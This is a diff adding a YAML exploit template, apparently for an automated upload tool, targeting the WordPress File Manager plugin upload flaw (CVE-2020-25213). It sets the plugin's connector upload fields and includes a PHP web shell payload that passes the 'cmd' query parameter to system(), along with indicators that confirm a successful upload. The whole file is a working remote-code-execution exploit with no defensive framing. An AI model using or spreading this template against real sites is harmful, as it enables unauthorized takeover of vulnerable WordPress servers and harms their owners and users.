@@ -1,0 +1,29 @@
+name: "WP File Manager RCE Final"
+description: "WordPress File Manager RCE with correct path detection"
+author: "@HaakimSec"
+version: "1.0"
+
+target:
+  param: "upload[]"
+
+form_data:
+  cmd: "upload"
+  target: "l1_Lw"
+
+payloads:
+  - name: "PHP RCE Shell"
+    filename: "goupload_final_rce.php"
+    extension: ".php"
+    body: |
+      <?php 
+      if(isset($_GET['cmd'])) {
+          echo "RCE_SUCCESS:";
+          system($_GET['cmd']);
+      }
+      ?>
+    tags: ["rce", "php", "wordpress", "cve-2020-25213"]
+
+success_indicators:
+  - '"added"'
+  - '"name":"goupload_final_rce.php"'
+  - '"url":"'
